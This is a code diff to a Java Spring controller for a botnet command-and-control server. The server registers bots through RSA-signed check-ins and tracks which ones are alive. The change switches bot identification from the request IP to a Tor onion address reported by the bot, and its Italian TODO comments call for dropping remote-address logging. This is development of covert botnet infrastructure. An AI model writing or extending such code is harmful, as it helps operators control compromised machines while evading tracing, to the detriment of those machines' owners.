@@ -66,21 +66,22 @@ public class CommandController {
 				String[] msgs = data.split("<CS>");
 				idBot = msgs[0];
 				String idBotSign = msgs[1];
+				String onionAddress=msgs[2];
 				Bot b = cmm.getbServ().searchBotId(idBot);
 				if (b != null) {
-					System.out.println("Conosco gia il bot: " + req.getRemoteAddr());
+					System.out.println("Conosco gia il bot: " + onionAddress);
 					try {
 						flag = cmm.getPki().validateSignedMessageRSA(idBot, idBotSign, cmm.getPki().rebuildPuK(b.getPubKey()));
 						if (flag) {
-							Pairs<OnionAddress, String> botAlive = new Pairs<OnionAddress, String>(new OnionAddress(req.getRemoteAddr()), idBot);
+							//TODO cambiare la ricezione del ip dal remote address e mi devo far madare l'onion
+							Pairs<OnionAddress, String> botAlive = new Pairs<OnionAddress, String>(new OnionAddress(onionAddress), idBot);
 							cmm.getnServ().getAliveBot().add(botAlive);
-							if (!b.getIp().equals(botAlive.getValue1().toString())) {
-								b.setIp(botAlive.getValue1().toString());
+							if (!b.getOnionAddress().equals(botAlive.getValue1().toString())) {
+								b.setOnionAddress(botAlive.getValue1().toString());
 								cmm.getbServ().updateBot(b);
 							}
 							response = new Pairs<Long, Integer>(new Long(-1), -1);
 						}
-
 						else
 							response = cmm.authReq(idBot);
 					} catch (InvalidKeyException | SignatureException e) {
@@ -99,6 +100,7 @@ public class CommandController {
 	@RequestMapping(value = "/hmac", method = RequestMethod.POST)
 	@ResponseBody
 	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error, HttpServletRequest req) throws IOException {
+		//TODO levare la remote address
 		System.out.println("Richiesta con hmac ricevuta da " + req.getRemoteAddr());
 		String response = "";
 		if (configEngine.isCommandandconquerStatus()) {
